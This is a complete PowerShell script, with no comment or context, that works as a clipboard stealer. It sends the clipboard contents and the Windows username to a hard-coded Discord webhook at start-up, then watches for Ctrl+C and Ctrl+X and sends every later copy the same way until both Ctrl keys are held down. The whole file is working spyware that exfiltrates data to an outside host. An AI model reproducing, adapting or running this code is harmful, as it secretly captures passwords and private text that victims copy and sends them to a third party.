Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

function dischat {

  [CmdletBinding()]
  param (    
  [Parameter (Position=0,Mandatory = $True)]
  [string]$con
  ) 
  
  $hookUrl = 'https://discord.com/api/webhooks/1073179217216405564/1BxJdfEhCmJn9GiMB24rtU2PaFchnUgNvG-QBXlk5MWXzMyAh6rw1cqw1foFLaTaT5J1'
  
$Body = @{
  'username' = $env:username
  'content' = $con
}


Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body

}


dischat (get-clipboard)

while (1){
    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
    $cKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
    $xKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)

       if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
       elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
       else {continue}
} 
